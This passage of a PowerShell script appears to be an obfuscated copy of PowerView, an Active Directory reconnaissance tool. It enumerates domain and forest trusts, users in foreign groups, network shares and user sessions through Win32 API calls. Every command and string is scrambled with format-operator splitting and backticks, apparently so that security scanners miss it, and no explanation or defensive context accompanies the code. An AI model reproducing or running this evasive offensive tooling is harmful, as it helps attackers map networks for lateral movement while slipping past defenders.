                            &("{3}{4}{0}{2}{1}"-f ("{0}{1}"-f'a','rni'),'g','n',("{1}{0}{2}" -f 'it','Wr','e-'),'W') "Unknown trust attribute: $($Props.trustattributes)  ";
                            "$($Props.trustattributes)";
                        }
                    }
                    ${D`ire`cTION} = Switch (${P`RopS}."TR`Us`TDirEc`TI`ON") {
                        0 { ("{0}{1}{2}"-f'D','i',("{0}{1}{2}" -f 's','ab','led')) }
                        1 { ("{2}{0}{1}"-f'bou','nd','In') }
                        2 { ("{2}{1}{0}" -f 'nd',("{1}{0}" -f 'bou','t'),'Ou') }
                        3 { ("{1}{4}{3}{2}{0}" -f'nal','B','io',("{1}{0}" -f'ct','re'),'idi') }
                    }
                    ${oB`J`ectGUId} = &("{1}{0}{2}"-f ("{1}{0}" -f'Obj','ew-'),'N','ect') ("{0}{1}"-f'Gu','id') @(,${pR`O`pS}."OB`J`eCT`Guid"[0])
                    ${d`OmAInt`RuSt} | &("{1}{2}{0}"-f 'r',("{2}{0}{1}" -f'-','Mem','Add'),'be') ("{3}{1}{0}{2}"-f't','er','y',("{1}{0}" -f 'op','Notepr')) ("{2}{0}{1}" -f'c',("{1}{0}"-f'Name','e'),("{1}{0}"-f 'r','Sou')) ${D`oMain}
                    ${D`oMaI`NTRuSt} | &("{1}{0}{2}" -f'Mem',("{1}{0}"-f 'd-','Ad'),'ber') ("{1}{2}{0}{3}"-f 'ep','No','t',("{0}{1}" -f'r','operty')) ("{2}{0}{1}{3}"-f("{0}{1}" -f'arg','et'),'Na','T','me') ${PRo`Ps}."nA`Me"[0]
                    ${dOMAINTR`U`ST} | &("{2}{3}{0}{1}"-f 'Me',("{1}{0}"-f 'er','mb'),'Ad','d-') ("{1}{2}{0}{3}"-f ("{0}{1}{2}"-f'ep','r','oper'),'No','t','ty') ("{0}{2}{1}"-f ("{1}{0}" -f'je','Ob'),("{0}{1}"-f 'tG','uid'),'c') "{$ObjectGuid}"
                    ${dOm`AinTRu`St} | &("{1}{0}{2}{3}" -f'm',("{2}{0}{1}" -f 'd-','Me','Ad'),'b','er') ("{1}{0}{2}{3}"-f ("{1}{0}" -f 'pe','tepro'),'No','r','ty') ("{2}{1}{0}"-f'ype','tT',("{1}{0}"-f 'us','Tr')) "$TrustAttrib"
                    ${dOM`AIN`TRuST} | &("{0}{2}{1}"-f 'Ad',("{2}{0}{1}"-f 'em','ber','M'),'d-') ("{1}{0}{3}{2}"-f ("{0}{2}{1}"-f 'tep','er','rop'),'No','y','t') ("{0}{1}{2}"-f'T',("{2}{1}{0}"-f 're','ustDi','r'),("{1}{0}" -f'ion','ct')) "$Direction"
                    ${D`OM`AiNT`RUSt}
                }
            }
        }

        else {
            
            ${fO`U`NdDOmaIN} = &("{0}{1}{2}"-f("{2}{0}{1}" -f '-','NetD','Get'),("{0}{1}" -f 'oma','i'),'n') -Domain ${D`OmAIN}
            
            if(${f`ounD`D`omAiN}) {
                (&("{1}{2}{3}{0}{4}" -f'ai',("{1}{2}{0}"-f'D','Get-','Net'),'o','m','n') -Domain ${D`omA`In}).("{4}{1}{6}{2}{5}{0}{3}"-f ("{1}{0}{2}"-f 'Relat','st','i'),'et','lT',("{1}{2}{0}" -f 'ips','ons','h'),'G','ru','Al')."invo`ke"()
            }     
        }
    }
}


function geT-ne`TfOr`ES`T`T`RuST {


    [CmdletBinding()]
    param(
        [Parameter(POSitIon=0,vALUEfRompipELinE=${Tr`Ue})]
        [String]
        ${fOre`ST}
    )

    process {
        ${fOU`NdFOr`eST} = &("{1}{2}{4}{3}{0}"-f't',("{0}{1}"-f 'Ge','t-'),("{1}{0}"-f 'tFo','Ne'),'es','r') -Forest ${Fo`R`ESt}
        if(${FOUn`D`FORest}) {
            ${Fou`Nd`F`OresT}.("{1}{2}{5}{3}{0}{6}{4}"-f 'ons','Get',("{0}{1}" -f 'All','Tru'),'ti','s',("{1}{0}" -f 'tRela','s'),'hip')."invO`Ke"()
        }
    }
}


function f`InD`-`FoREIg`NUsER {


    [CmdletBinding()]
    param(
        [String]
        ${uSEr`Na`mE},

        [String]
        ${D`omAIN},

        [String]
        ${Do`MaInCO`NT`RoLLeR},

        [Switch]
        ${Ld`Ap},

        [Switch]
        ${R`E`curSE},

        [ValidateRange(1,10000)] 
        [Int]
        ${pa`G`ESiZe} = 200
    )

    function GeT-F`OREI`gnu`Ser {
        
        param(
            [String]
            ${u`S`e`RnamE},

            [String]
            ${d`o`maiN},

            [String]
            ${Doma`iNco`N`TROL`lEr},

            [ValidateRange(1,10000)] 
            [Int]
            ${pa`g`EsiZE} = 200
        )

        if (${d`oMA`in}) {
            
            ${DIstIn`G`U`ISheddOmA`INnaMe} = "DC=" + ${do`Main} -replace '\.',("{0}{1}" -f ',DC','=')
        }
        else {
            ${d`IsTi`N`guIs`HeDDOMaiNnAme} = [String] ([adsi]'')."DIS`T`in`gUISheD`NA`Me"
            ${DoM`Ain} = ${DI`sT`iNG`UISHeDDOMaINna`mE} -replace 'DC=','' -replace ',','.'
        }

        &("{1}{0}{2}" -f("{1}{0}" -f'et','t-N'),'Ge',("{1}{0}"-f'er','Us')) -Domain ${D`omAIn} -DomainController ${doMaIN`CoNT`Ro`lLEr} -UserName ${uSern`AME} -PageSize ${Pa`geSi`ZE} | &("{2}{3}{1}{0}"-f 'ect','bj',("{1}{0}"-f'e','Wher'),'-O') {${_}."m`emBE`Rof"} | &("{3}{2}{0}{1}" -f'h',("{0}{1}{2}"-f '-Ob','jec','t'),'c',("{0}{1}"-f'Fo','rEa')) {
            ForEach (${mEM`Be`RSh`ip} in ${_}."M`Em`BeROf") {
                ${InD`Ex} = ${MEmBeR`sh`Ip}.("{2}{1}{0}" -f 'f','O',("{0}{1}" -f 'Ind','ex'))."iNV`oke"("DC=")
                if(${INd`Ex}) {
                    
                    ${gRo`UP`d`OMain} = $(${m`EMb`E`RsHip}.("{1}{2}{0}" -f'ing',("{1}{0}" -f'ubst','s'),'r')."inv`oke"(${I`N`DEx})) -replace 'DC=','' -replace ',','.'
                    
                    if (${g`R`oUPDOm`Ain}.("{1}{0}{2}" -f 'm','Co',("{0}{1}"-f 'pareT','o'))."i`NVoKE"(${Do`m`AIn})) {
                        
                        ${G`Roupna`me} = ${mEmberS`h`iP}.("{0}{1}" -f 'spl','it')."Invo`ke"(",")[0].("{1}{0}"-f 'lit','sp')."iNVO`Ke"("=")[1]
                        ${f`OrEiGn`UsER} = &("{1}{2}{0}"-f ("{0}{1}" -f'jec','t'),("{1}{0}"-f 'w-O','Ne'),'b') ("{2}{1}{0}"-f ("{1}{0}" -f 'ect','bj'),'O','PS')
                        ${FOr`EignUs`ER} | &("{2}{0}{1}" -f ("{1}{2}{0}"-f'mbe','d','-Me'),'r','Ad') ("{3}{2}{1}{0}"-f'rty','ope','epr','Not') ("{2}{0}{1}" -f 'Dom','ain',("{0}{1}" -f'U','ser')) ${doM`AIN}
                        ${FoR`eiG`N`USER} | &("{0}{1}{2}"-f ("{1}{2}{0}" -f'emb','Add','-M'),'e','r') ("{1}{2}{3}{0}"-f 'y',("{0}{2}{1}"-f'No','r','tep'),'o',("{1}{0}"-f 't','per')) ("{0}{1}" -f ("{1}{0}" -f'Na','User'),'me') ${_}."saMAc`cOunt`NaME"
                        ${FO`R`Eig`NUSEr} | &("{0}{2}{1}" -f 'Ad','ber',("{0}{1}" -f'd-M','em')) ("{3}{1}{0}{2}"-f 'r',("{1}{0}" -f'ope','r'),'ty',("{1}{0}"-f'ep','Not')) ("{2}{3}{1}{0}" -f'n','i',("{1}{0}{2}"-f'roup','G','Do'),'ma') ${GROup`do`MA`iN}
                        ${F`OreIGn`USeR} | &("{1}{2}{0}" -f'r','Add',("{2}{1}{0}"-f 'embe','M','-')) ("{2}{1}{0}" -f ("{0}{1}" -f 'er','ty'),("{1}{0}"-f 'prop','e'),'Not') ("{0}{1}{2}"-f'Gr',("{1}{0}"-f 'pN','ou'),'ame') ${grouPN`A`me}
                        ${forEi`gNUS`Er} | &("{0}{2}{1}" -f ("{0}{1}{2}" -f 'Ad','d','-Mem'),'er','b') ("{1}{2}{0}" -f("{0}{1}"-f 'per','ty'),'No',("{0}{1}" -f 'tepr','o')) ("{0}{1}" -f 'Gr',("{0}{1}"-f'ou','pDN')) ${m`eM`BERSHip}
                        ${F`OR`EigNUsEr}
                    }
                }
            }
        }
    }

    if (${r`Ecu`RSE}) {
        
        if(${L`Dap} -or ${Do`M`AINCo`NtR`OLlER}) {
            ${dO`M`AinTr`USts} = &("{0}{2}{3}{5}{1}{4}" -f 'In',("{1}{0}"-f'nTr','ai'),'vo','ke-','ust',("{0}{1}" -f'MapDo','m')) -LDAP -DomainController ${d`OmAI`Ncon`TRoL`l`er} -PageSize ${PA`gEsi`ze} | &("{1}{2}{0}" -f't',("{1}{0}"-f 'Ea','For'),("{2}{1}{0}" -f'ec','h-Obj','c')) { ${_}."s`OURceD`Oma`in" } | &("{2}{1}{0}"-f 't',("{0}{1}"-f '-Ob','jec'),("{1}{0}"-f't','Sor')) -Unique
        }
        else {
            ${D`OmAinT`Ru`StS} = &("{1}{3}{0}{4}{2}{5}" -f'Map',("{0}{1}"-f 'Inv','o'),("{0}{1}"-f 'o','mai'),'ke-','D',("{0}{1}" -f 'nT','rust')) -PageSize ${p`Ag`eS`iZe} | &("{1}{3}{4}{2}{0}" -f'ect','For','j',("{0}{1}"-f 'Eac','h-'),'Ob') { ${_}."sO`U`RcEDoMA`iN" } | &("{1}{0}{2}" -f'o','S',("{1}{0}{2}" -f't-O','r','bject')) -Unique
        }

        ForEach(${DoMa`intR`U`st} in ${D`OMAiN`TrUS`TS}) {
            
            &("{2}{0}{1}" -f '-V',("{0}{1}"-f 'erbos','e'),("{0}{1}" -f 'Wri','te')) (("{0}{1}"-f 'En','ume')+("{0}{1}"-f 'rat','i')+'n'+'g '+'t'+'ru'+'st '+("{1}{0}" -f 'roups','g')+' '+'i'+'n '+("{1}{0}" -f 'oma','d')+'in '+"$DomainTrust")
            &("{2}{1}{3}{0}"-f("{0}{1}" -f 'eig','nUser'),("{0}{1}"-f'et-F','o'),'G','r') -Domain ${dOMA`iNTR`USt} -UserName ${u`SErna`mE} -PageSize ${p`Ag`EsiZE}
        }
    }
    else {
        &("{1}{0}{2}{3}{4}"-f 't-F','Ge',("{1}{0}" -f 'rei','o'),("{0}{1}" -f'gn','Us'),'er') -Domain ${do`mA`IN} -DomainController ${doMAin`c`on`TR`oLLeR} -UserName ${us`er`NAme} -PageSize ${PA`ge`Size}
    }
}


function f`iND`-FOR`e`iGNGRo`UP {


    [CmdletBinding()]
    param(
        [String]
        ${gR`ou`pName} = '*',

        [String]
        ${dO`mA`IN},

        [String]
        ${D`oM`A`IncO`NTRolLer},

        [Switch]
        ${l`daP},

        [Switch]
        ${r`eCUR`Se},

        [ValidateRange(1,10000)] 
        [Int]
        ${pAge`s`Ize} = 200
    )

    function G`eT`-`F`Or`Ei`gngrOUp {
        param(
            [String]
            ${G`R`oUpNamE} = '*',

            [String]
            ${d`oMAIn},

            [String]
            ${DO`maI`Nc`O`NtrOllEr},

            [ValidateRange(1,10000)] 
            [Int]
            ${Pa`ge`SizE} = 200
        )

        if(-not ${DoM`AIn}) {
            ${d`O`MAiN} = (&("{0}{1}{3}{2}" -f ("{1}{0}"-f'et-N','G'),'etD','ain','om'))."N`AMe"
        }

        ${d`O`MaInDN} = "DC=$($Domain.Replace('.', ',DC='))"
        &("{1}{3}{0}{2}" -f 'os',("{0}{1}"-f'Wri','t'),'e',("{1}{0}" -f'b','e-Ver')) ('Do'+("{1}{0}" -f':','mainDN')+' '+"$DomainDN")

        
        ${ex`Clu`deGrou`Ps} = @(("{0}{1}" -f 'U',("{1}{0}" -f 's','ser')), ("{2}{0}{3}{1}"-f ("{1}{0}" -f 'n U','ai'),'s','Dom','ser'), ("{0}{1}" -f 'Gue','sts'))

        
        &("{1}{3}{0}{2}" -f 'tG',("{1}{0}"-f 't-','Ge'),("{1}{0}" -f'oup','r'),'Ne') -GroupName ${gRoU`p`N`AmE} -Domain ${DO`mA`in} -DomainController ${DOma`IN`coNTrO`LLeR} -FullData -PageSize ${P`AgEsI`ze} | &("{0}{2}{1}{3}"-f 'Wh','O',("{1}{0}"-f'-','ere'),("{0}{1}"-f 'b','ject')) {${_}."me`mB`ER"} | &("{0}{3}{1}{2}"-f 'Wh',("{0}{1}" -f're-','Ob'),("{1}{0}" -f'ct','je'),'e') {
            
            -not (${eX`Cludeg`ROUPs} -contains ${_}."sAmaC`cOu`NtNAme") } | &("{0}{4}{1}{3}{2}"-f'For','-O','t',("{0}{1}"-f'b','jec'),("{1}{0}" -f'h','Eac')) {
                
                ${GRoupN`A`Me} = ${_}."saM`AC`COUNtna`mE"

                ${_}."MEmB`eR" | &("{0}{2}{1}" -f ("{0}{1}"-f 'For','Ea'),'ect',("{2}{0}{1}" -f 'h-O','bj','c')) {
                    
                    
                    if ((${_} -match ("{2}{1}{4}{3}{0}"-f ("{0}{1}"-f '.','*-.*'),("{1}{0}"-f'-1-','=S'),'CN','-21','5')) -or (${Dom`AiN`DN} -ne (${_}.("{2}{0}{1}" -f 's',("{0}{1}"-f'tri','ng'),'sub')."INVO`KE"(${_}.("{0}{1}" -f("{0}{1}"-f 'Inde','x'),'Of')."iN`V`OkE"("DC="))))) {

                        ${U`seRd`oMA`In} = ${_}.("{1}{2}{0}" -f("{0}{1}"-f 't','ring'),'sub','S')."iNV`oke"(${_}.("{0}{1}{2}" -f 'In','de','xOf')."iN`VOKE"("DC=")) -replace 'DC=','' -replace ',','.'
                        ${U`SErNa`ME} = ${_}.("{0}{1}" -f 's',("{1}{0}" -f 'it','pl'))."iN`VOKE"(",")[0].("{1}{0}" -f 't',("{0}{1}" -f'sp','li'))."In`VOkE"("=")[1]

                        ${FO`R`eiGNgroU`P`UseR} = &("{1}{3}{0}{2}" -f'ec',("{1}{0}" -f 'w-','Ne'),'t','Obj') ("{0}{1}"-f ("{2}{0}{1}"-f'SObje','c','P'),'t')
                        ${fo`ReI`G`NG`ROU`pUser} | &("{0}{1}{2}"-f 'Add',("{0}{1}"-f'-','Membe'),'r') ("{1}{2}{0}" -f ("{0}{1}" -f'pert','y'),("{0}{1}" -f'Note','p'),'ro') ("{2}{1}{0}" -f("{1}{0}" -f'main','o'),'pD',("{0}{1}"-f'Gr','ou')) ${D`oMAIn}
                        ${f`oR`eiG`Ng`ROuPusER} | &("{0}{1}{2}" -f 'Add','-',("{2}{0}{1}" -f 'emb','er','M')) ("{0}{1}{2}"-f ("{0}{1}"-f 'Note','pro'),'pe','rty') ("{2}{0}{1}" -f 'o',("{1}{0}" -f'pName','u'),'Gr') ${gR`O`UPnAMe}
                        ${fOReiG`N`gRO`UpU`SER} | &("{0}{2}{1}" -f("{1}{0}"-f 'm','Add-Me'),'r','be') ("{2}{1}{0}"-f ("{1}{3}{0}{2}" -f'rope','e','rty','p'),'ot','N') ("{2}{3}{1}{0}"-f'n','ai',("{0}{1}{2}"-f'Us','e','rDo'),'m') ${uSerd`Om`AiN}
                        ${Forei`gNgr`OUpU`s`ER} | &("{3}{1}{0}{2}"-f 'Mem','-','ber','Add') ("{1}{0}{2}" -f ("{0}{1}"-f 'e','pro'),'Not',("{1}{0}"-f'ty','per')) ("{1}{0}"-f'ame',("{0}{1}"-f 'Use','rN')) ${u`SeRnaMe}
                        ${F`o`ReIGngrO`Up`U`SER} | &("{2}{0}{1}" -f'dd',("{2}{0}{1}" -f'em','ber','-M'),'A') ("{3}{0}{2}{1}" -f'ro',("{0}{1}"-f 'er','ty'),'p',("{0}{1}" -f'Not','ep')) ("{1}{0}"-f 'N',("{0}{1}"-f 'Use','rD')) ${_}
                        ${FOREigN`Gr`oU`pU`Ser}
                    }
                }
        }
    }

    if (${Re`C`Urse}) {
        
        if(${LD`Ap} -or ${DOMA`iN`CO`NTRoLler}) {
            ${DOMAi`NTR`Us`TS} = &("{0}{1}{3}{4}{2}"-f ("{0}{1}{2}"-f'I','n','voke-'),("{0}{1}"-f 'Ma','pD'),("{1}{0}"-f 'st','Tru'),'om','ain') -LDAP -DomainController ${d`oM`AIncoNTRoLl`Er} -PageSize ${pAGeS`i`zE} | &("{0}{2}{1}" -f("{1}{0}"-f 'ch-O','ForEa'),'ct','bje') { ${_}."sOUrcED`O`MAiN" } | &("{1}{0}{2}"-f ("{0}{2}{1}"-f'or','j','t-Ob'),'S','ect') -Unique
        }
        else {
            ${do`MaIn`TruS`TS} = &("{2}{3}{0}{4}{5}{1}"-f ("{1}{0}{2}" -f '-','oke','MapD'),("{1}{0}" -f 'st','nTru'),'In','v','om','ai') -PageSize ${P`Ag`eSizE} | &("{2}{0}{4}{3}{1}"-f 'ac','ect',("{0}{1}"-f 'Fo','rE'),'j',("{0}{1}" -f'h-O','b')) { ${_}."souR`C`EDOMaIn" } | &("{0}{2}{1}" -f 'S',("{0}{1}{2}"-f'-O','bjec','t'),'ort') -Unique
        }

        ForEach(${dOMa`I`N`TruST} in ${DOMaI`NTRUs`TS}) {
            
            &("{2}{1}{3}{0}"-f 'e',("{0}{2}{1}"-f 'e-V','b','er'),("{0}{1}"-f'Wri','t'),'os') ('En'+'um'+("{0}{1}"-f 'erati','n')+'g '+'tru'+'st'+' '+'g'+("{0}{1}" -f'rou','ps')+' '+'in'+' '+'dom'+'ain'+' '+"$DomainTrust")
            &("{3}{1}{2}{0}" -f 'p',("{2}{0}{1}{3}" -f'ore','i','F','gnGr'),'ou',("{1}{0}" -f't-','Ge')) -GroupName ${g`ROUpNa`me} -Domain ${D`OM`AIN} -DomainController ${dOmaIn`Co`N`TrOL`ler} -PageSize ${P`AGe`sIzE}
        }
    }
    else {
        &("{3}{0}{2}{4}{1}" -f'Fo',("{0}{2}{1}" -f'i','nGroup','g'),'r',("{1}{0}"-f't-','Ge'),'e') -GroupName ${gR`o`UPnaME} -Domain ${d`Om`AIn} -DomainController ${DOMai`NCon`T`ROLlEr} -PageSize ${P`Ag`eSize}
    }
}


function invOK`E`-mapdo`mAi`NtR`Ust {

    [CmdletBinding()]
    param(
        [Switch]
        ${l`DAP},

        [String]
        ${d`oMaiNC`OnTr`oLLeR},

        [ValidateRange(1,10000)] 
        [Int]
        ${PAgE`s`Ize} = 200
    )

    
    ${SeEn`d`oM`AiNs} = @{}

    
    ${dOm`Ai`Ns} = &("{2}{0}{1}" -f'jec','t',("{0}{1}" -f'New-O','b')) ("{0}{3}{1}{4}{6}{5}{2}"-f ("{0}{1}" -f'Sy','stem'),'tio','ck',("{1}{0}" -f'c','.Colle'),'n','a',("{0}{1}" -f 's.S','t'))

    
    ${cUR`ReN`Td`OmaIn} = (&("{0}{1}{2}"-f'G',("{2}{0}{3}{1}" -f'NetDo','a','et-','m'),'in'))."n`AMe"
    ${DOM`Ai`Ns}.("{1}{0}" -f 'h','pus')."iNvo`ke"(${cURR`e`NtDo`MAIn})

    while(${dOM`AInS}."cou`Nt" -ne 0) {

        ${Do`ma`In} = ${DomAI`NS}.("{0}{1}" -f'P','op')."In`Vo`kE"()

        
        if (-not ${SE`eN`Dom`AiNS}.("{1}{2}{0}"-f 'ey','Co',("{1}{0}"-f'K','ntains'))."iNv`okE"(${DO`mA`IN})) {
            
            &("{3}{0}{2}{1}"-f ("{0}{1}" -f'rit','e-'),("{1}{0}"-f 'ose','erb'),'V','W') ('E'+("{1}{0}" -f 'umer','n')+("{1}{0}"-f'ting','a')+' '+'tr'+("{1}{0}"-f 's ','ust')+'f'+'or '+'d'+("{1}{0}" -f 'ain','om')+' '+"'$Domain'")

            
            ${N`ULl} = ${s`EenDo`Ma`INS}.("{0}{1}" -f'a','dd')."in`V`OkE"(${Do`M`AIN}, "")

            try {
                
                if(${lD`AP} -or ${do`M`AiN`con`T`RoLler}) {
                    ${tR`UsTs} = &("{2}{1}{3}{0}" -f'st',("{1}{0}{2}" -f'-N','et','etD'),'G',("{2}{0}{1}"-f 'inT','ru','oma')) -Domain ${D`o`MAiN} -LDAP -DomainController ${do`M`AINc`oNtrOLLeR} -PageSize ${P`A`GESIze}
                }
                else {
                    ${Tr`Us`Ts} = &("{0}{2}{3}{1}"-f("{0}{1}" -f 'Get','-N'),'ust','etD',("{2}{0}{1}" -f'ain','Tr','om')) -Domain ${do`MA`In} -PageSize ${PAg`E`S`ize}
                }

                if(${truS`Ts} -isnot [system.array]) {
                    ${t`RUSTS} = @(${tr`UsTS})
                }

                
                ${tRU`STS} += &("{0}{1}{2}{3}"-f'Get',("{0}{1}" -f'-Net','For'),("{1}{0}{2}"-f 'Tr','est','us'),'t') -Forest ${DOMA`In}

                if (${tR`USTS}) {

                    
                    ForEach (${T`RU`St} in ${T`R`USTS}) {
                        ${So`URcE`doM`AiN} = ${t`Ru`sT}."SOUrCE`Na`Me"
                        ${t`A`RgeTdoMAIN} = ${T`R`UST}."Tar`geT`NaME"
                        ${T`RusT`TYPE} = ${tru`ST}."TRust`TyPE"
                        ${tru`stD`iRECti`on} = ${t`Ru`St}."T`RuSTdi`RecTi`on"

                        
                        ${Nu`LL} = ${doM`AiNS}.("{1}{0}"-f'h','pus')."I`NVoKe"(${T`ArgE`TD`O`MAIn})

                        
                        ${doMa`in`TR`UsT} = &("{0}{2}{1}" -f'Ne',("{1}{0}" -f 'ect','j'),("{1}{0}" -f'-Ob','w')) ("{0}{1}{2}"-f ("{0}{1}" -f 'PS','Ob'),'je','ct')
                        ${dO`m`AINT`RUst} | &("{2}{1}{0}" -f 'er','emb',("{0}{1}" -f'A','dd-M')) ("{0}{1}{2}" -f ("{2}{1}{0}"-f'pr','ote','N'),'op',("{0}{1}"-f 'e','rty')) ("{0}{1}{2}" -f("{0}{1}{2}" -f 'Sour','c','eD'),'om','ain') "$SourceDomain"
                        ${DO`mAiNt`R`UST} | &("{0}{3}{1}{2}"-f 'A','d-',("{1}{0}" -f'mber','Me'),'d') ("{0}{1}{2}" -f'N',("{1}{0}" -f'pro','ote'),("{1}{0}" -f'erty','p')) ("{0}{2}{3}{1}"-f'Ta','ain','rge',("{1}{0}" -f 'Dom','t')) "$TargetDomain"
                        ${DoMaI`NtRU`sT} | &("{2}{0}{1}"-f 'd',("{0}{1}"-f'-Mem','ber'),'Ad') ("{2}{0}{1}" -f't','y',("{2}{1}{0}"-f 'per','pro','Note')) ("{0}{1}{2}"-f'Tru','stT','ype') "$TrustType"
                        ${DoM`AI`Ntr`UST} | &("{0}{1}{3}{2}"-f 'A','d','ber',("{0}{1}" -f'd-Me','m')) ("{3}{2}{0}{1}"-f("{0}{1}" -f 'eprop','er'),'ty','t','No') ("{2}{0}{1}{4}{3}"-f'us',("{0}{1}"-f 'tDi','r'),'Tr','ion','ect') "$TrustDirection"
                        ${d`O`MaIntRUst}
                    }
                }
            }
            catch {
                &("{2}{0}{3}{1}"-f 'i','ng','Wr',("{1}{0}"-f '-Warni','te')) ('[!]'+' '+'Err'+("{0}{1}" -f 'o','r: ')+"$_")
            }
        }
    }
}











${M`OD} = &("{4}{0}{1}{3}{2}" -f 'n','Mem',("{1}{0}"-f'le','du'),("{0}{1}" -f 'ory','Mo'),("{1}{0}"-f'ew-I','N')) -ModuleName ("{1}{0}" -f ("{0}{1}"-f 'in','32'),'W')


${Fu`N`Cti`o`NdeFInIT`IONS} = @(
    (&("{1}{0}" -f 'c','fun') ("{2}{0}{1}"-f("{0}{1}"-f'etap','i'),'32','n') ("{2}{0}{1}"-f 'tS',("{0}{2}{1}" -f 'hare','um','En'),'Ne') ([Int]) @([String], [Int],  ${s`qG}.("{0}{3}{1}{2}"-f'Mak','yR',("{1}{0}" -f 'Type','ef'),'eB')."IN`Vo`Ke"(), [Int],   (&("{1}{0}"-f'bLe',("{1}{0}"-f'IA','VAR')) ("M"+"P6")  -ValUeo ).("{3}{2}{0}{4}{1}" -f("{1}{0}{2}"-f 'RefT','keBy','y'),'e','a','M','p')."IN`V`oke"(),   ( &("{0}{2}{1}" -f 'vAr','E',("{0}{1}"-f 'IaB','L')) ("{1}{0}" -f'6','mp')  )."vA`LUe".("{0}{2}{1}"-f ("{1}{0}"-f'B','Make'),("{1}{0}{2}"-f 'yp','RefT','e'),'y')."In`VOKE"(),   (  &('gi') (("{1}{0}"-f 'Ri','vA')+"a"+("{0}{1}"-f 'ble',':M')+"P6"))."VaL`UE".("{3}{1}{2}{0}"-f 'e','ake',("{1}{2}{0}" -f'p','ByR','efTy'),'M')."Inv`okE"())),
    (&("{0}{1}"-f'fu','nc') ("{1}{2}{0}"-f '32','ne',("{1}{0}"-f'pi','ta')) ("{2}{3}{1}{0}"-f'm','nu',("{2}{1}{0}" -f 'kst','tW','Ne'),("{2}{1}{0}"-f 'erE','Us','a')) ([Int]) @([String], [Int],  (  &("{2}{0}{1}" -f("{0}{1}"-f'RI','AB'),'le',("{2}{0}{1}"-f'-','Va','GeT')) ('s'+'qg') -VAlUeO  ).("{3}{1}{0}{2}" -f ("{2}{1}{0}" -f'T','ef','eByR'),'ak','ype','M')."In`Vo`Ke"(), [Int],   (&("{1}{0}" -f 'm','ite')  ("{1}{3}{0}{2}" -f'p','vArIable','6',':M') )."VAL`UE".("{3}{4}{1}{2}{0}" -f'pe','ef','Ty','Ma',("{0}{1}"-f'keBy','R'))."inv`okE"(),  (&("{2}{1}{0}" -f 'm','Ite',("{0}{1}"-f'Ge','t-'))  ("{1}{2}{0}" -f '6','vaRIAbL','E:mp')  )."va`Lue".("{0}{1}{2}"-f ("{0}{1}"-f'Ma','keB'),("{0}{1}"-f'y','RefT'),'ype')."Invo`KE"(),  (&("{2}{1}{0}"-f'LE','IaB','VaR') ("{0}{1}"-f 'm','p6')  -VAL).("{2}{0}{1}"-f("{1}{0}" -f'Ty','ef'),'pe',("{2}{1}{0}"-f'R','keBy','Ma'))."InV`oke"())),
    (&("{0}{1}"-f 'fu','nc') ("{1}{2}{0}" -f'32',("{0}{1}" -f 'net','ap'),'i') ("{1}{2}{3}{0}" -f 'um','N',("{1}{0}"-f 'essi','etS'),("{0}{1}"-f'onE','n')) ([Int]) @([String], [String], [String], [Int],   (&('ls')  ("{3}{1}{0}{2}" -f 'IaBL','R','e:sqG','va'))."VA`lue".("{0}{2}{3}{1}"-f'Ma',("{1}{0}" -f 'ype','fT'),'keB','yRe')."I`NvoKE"(), [Int],   ( &("{1}{2}{0}{3}"-f'bl',("{1}{0}{2}" -f 't-V','Ge','a'),'ria','e')  ("{0}{1}" -f 'MP','6') )."Va`lUe".("{4}{0}{3}{1}{2}"-f 'e','fTy','pe',("{0}{1}"-f'B','yRe'),'Mak')."InV`oKe"(),   (  &("{0}{2}{1}" -f'v','e',("{1}{0}{2}"-f 'A','aRI','bl'))  ("{0}{1}"-f 'MP','6') )."Val`UE".("{2}{3}{0}{1}{4}" -f 'k','eB','M','a',("{1}{2}{0}"-f'Type','yR','ef'))."in`VOKe"(),  (&("{0}{2}{1}" -f 'GEt','tEm',("{0}{1}" -f'-c','HILdi'))  (("{0}{1}{2}" -f'Vari','A','BlE')+":"+"mP6")  )."V`ALuE".("{2}{1}{0}" -f("{0}{1}"-f 'f','Type'),("{1}{0}" -f'e','akeByR'),'M')."INVo`kE"())),
    (&("{0}{1}"-f'fun','c') ("{1}{2}{0}"-f'32','net','api') ("{1}{2}{0}{3}{4}" -f ("{0}{2}{1}" -f'iBuf','er','f'),'Ne','tAp','F','ree') ([Int]) @([IntPtr])),
    (&("{0}{1}"-f 'fu','nc') ("{2}{1}{0}"-f'2',("{0}{1}" -f'va','pi3'),'ad') ("{2}{0}{3}{1}"-f ("{2}{1}{0}"-f'anage','M','nSC'),'W','Ope','r') ([IntPtr]) @([String], [String], [Int])),
    (&("{1}{0}"-f'unc','f') ("{2}{1}{0}"-f'i32',("{0}{1}" -f'dva','p'),'a') ("{0}{2}{1}{4}{3}" -f'C',("{0}{1}"-f 'ose','S'),'l',("{1}{2}{0}" -f 'dle','eH','an'),("{1}{0}" -f 'rvic','e')) ([Int]) @([IntPtr])),
    (&("{1}{0}" -f 'c','fun') ("{1}{2}{0}" -f '32',("{0}{1}" -f'wt','sap'),'i') ("{4}{2}{3}{1}{0}" -f 'x','erE','Ser','v',("{1}{0}" -f 'TSOpen','W')) ([IntPtr]) @([String])),
    (&("{0}{1}" -f 'f','unc') ("{2}{1}{0}"-f '32','pi',("{0}{1}" -f 'wt','sa')) ("{2}{0}{3}{5}{1}{4}"-f("{1}{0}" -f 'num','E'),'E','WTS',("{1}{0}"-f'at','er'),'x',("{0}{1}{2}" -f'eSe','ssion','s')) ([Int]) @([IntPtr],  ( &("{2}{1}{0}" -f'bLE','rIa',("{1}{0}"-f'T-vA','GE')) ('Mp'+'6') -Va ).("{0}{3}{1}{2}{4}" -f 'Mak','efT','y',("{1}{0}"-f'ByR','e'),'pe')."INV`OkE"(), [Int],   (&("{0}{1}{2}" -f 'ge',("{1}{0}" -f 'iTe','T-'),'M') ('v'+("{0}{1}"-f 'a','ria')+'bLE'+("{0}{1}"-f ':S','qG')))."Val`UE".("{0}{2}{1}" -f("{0}{1}" -f'Ma','keB'),("{2}{0}{1}" -f 'p','e','RefTy'),'y')."in`V`oKE"(),    ( &("{0}{1}"-f 'G','Ci')  (("{0}{2}{1}"-f 'Va','E:','RiAbL')+"MP"+"6"))."va`LuE".("{0}{1}{2}{3}" -f'M',("{2}{0}{1}" -f 'eB','yR','ak'),'e',("{0}{1}" -f'f','Type'))."INV`O`KE"())),
